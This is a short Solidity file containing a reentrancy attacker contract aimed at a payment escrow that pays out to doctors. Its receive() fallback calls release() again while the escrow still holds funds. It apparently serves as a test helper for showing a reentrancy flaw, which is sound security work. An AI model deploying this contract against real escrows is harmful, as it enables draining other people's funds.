// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPaymentEscrow {
    function deposit(address doctor) external payable returns (uint256);
    function release(uint256 escrowId) external;
    function refund(uint256 escrowId) external;
}

contract ReentrancyAttacker {
    IPaymentEscrow public escrow;
    uint256 public escrowId;

    constructor(address _escrow) {
        escrow = IPaymentEscrow(_escrow);
    }

    function setEscrowId(uint256 _id) external {
        escrowId = _id;
    }

    function attack() external {
        escrow.release(escrowId);
    }

    receive() external payable {
        if (address(escrow).balance > 0) {
            escrow.release(escrowId);
        }
    }
}
